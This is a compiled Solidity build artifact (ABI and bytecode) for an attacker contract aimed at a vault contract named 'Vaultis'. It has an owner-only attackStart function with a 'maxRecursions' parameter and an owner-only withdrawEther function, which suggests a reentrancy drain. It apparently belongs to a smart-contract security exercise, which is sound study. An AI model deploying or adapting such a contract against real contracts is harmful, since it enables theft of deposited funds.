{"abi":[{"type":"constructor","inputs":[{"name":"_vaultisAddress","type":"address","internalType":"address payable"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attackStart","inputs":[{"name":"amount","type":"uint256","internalType":"uint256"},{"name":"maxRecursions","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"owner","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"vaultis","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract Vaultis"}],"stateMutability":"view"},{"type":"function","name":"withdrawEther","inputs":[],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b50604051610366380380610366833981016040819052602b916057565b5f80546001600160a01b039092166001600160a01b031992831617905560018054909116331790556082565b5f602082840312156066575f5ffd5b81516001600160a01b0381168114607b575f5ffd5b9392505050565b6102d78061008f5f395ff3fe608060405260043610610041575f3560e01c80635bdf457d1461004c5780636cc7f1bf146100865780637362377b1461009b5780638da5cb5b146100af575f5ffd5b3661004857005b5f5ffd5b348015610057575f5ffd5b505f5461006a906001600160a01b031681565b6040516001600160a01b03909116815260200160405180910390f35b610099610094366004610281565b6100ce565b005b3480156100a6575f5ffd5b506100996101f4565b3480156100ba575f5ffd5b5060015461006a906001600160a01b031681565b6001546001600160a01b0316331461012b5760405162461bcd60e51b815260206004820152601b60248201527a4f6e6c79206f776e65722063616e2073746172742061747461636b60281b60448201526064015b60405180910390fd5b8147101561018d5760405162461bcd60e51b815260206004820152602960248201527f496e73756666696369656e742062616c616e636520666f7220696e697469616c60448201526820776974686472617760b81b6064820152608401610122565b805f03610198575050565b5f546040516333f707d160e01b8152600481018490526001600160a01b03909116906333f707d1906024015f604051808303815f87803b1580156101da575f5ffd5b505af11580156101ec573d5f5f3e3d5ffd5b505050505050565b6001546001600160a01b031633146102485760405162461bcd60e51b81526020600482015260176024820152764f6e6c79206f776e65722063616e20776974686472617760481b6044820152606401610122565b6001546040516001600160a01b03909116904780156108fc02915f818181858888f1935050505015801561027e573d5f5f3e3d5ffd5b50565b5f5f60408385031215610292575f5ffd5b5050803592602090910135915056fea264697066735822122043a407e93005570ec69a96f7d826c5e23a3eea8a86cd8be847bf92a3fdca0b0664736f6c634300081e0033","linkReferences":{}},"methodIdentifiers":{"attackStart(uint256,uint256)":"6cc7f1bf","owner()":"8da5cb5b","vaultis()":"5bdf457d","withdrawEther()":"7362377b"},"id":3}